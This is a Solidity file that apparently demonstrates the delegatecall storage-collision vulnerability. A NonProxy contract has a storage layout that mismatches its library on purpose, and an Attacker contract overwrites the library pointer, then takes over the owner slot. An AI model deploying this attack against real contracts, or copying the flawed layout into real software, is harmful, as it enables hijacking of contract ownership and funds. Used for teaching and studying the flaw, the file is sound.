// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// Logic contract
contract ImplementationLib {

    uint public someNumber; // slot 0

    function updateSomeNumber(uint _num) external {
        someNumber = _num;
    }
}

contract NonProxy {

    address public lib; // slot 0
    address public owner; // slot 1
    uint public someNumber; // slot 2

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function updateSomeNumber(uint _num) external {
        (bool s, ) = lib.delegatecall(abi.encodeWithSignature("updateSomeNumber(uint256)", _num));
        require(s, "Failed updateSomeNumber");
    }

    // Same example but with Proxy/fallback approach
    // fallback() external {
    //     (bool s, ) = lib.delegatecall(msg.data);
    //     require(s, "Fallback failed");
    // }
}

contract Attacker {

    // Copy order of state variables of Proxy
    address public lib; // slot 0
    address public owner; // slot 1
    uint public someNumber; // slot 2

    //address public proxy; // slot 3 : // Same example but with Proxy/fallback approach
    NonProxy public nonProxy; // slot 3

    constructor(address _addr) {
        // proxy = _addr; // Same example but with Proxy/fallback approach
        nonProxy = NonProxy(_addr);
    }

    function attack() external {
        // Same example but with Proxy/fallback approach
        // proxy.call(abi.encodeWithSignature("updateSomeNumber(uint256)", uint256(uint160(address(this)))));
        // proxy.call(abi.encodeWithSignature("updateSomeNumber(uint256)", 1));

        nonProxy.updateSomeNumber(uint256(uint160(address(this))));
        nonProxy.updateSomeNumber(1);
    }

    // make sure same signature as NonProxy updateSomeNumber() , you dont need to use _num
    function updateSomeNumber(uint _num) external {
        // Tell NonProxy contract to update its slot 1 variable to msg.sender
        owner = msg.sender;
    }

}
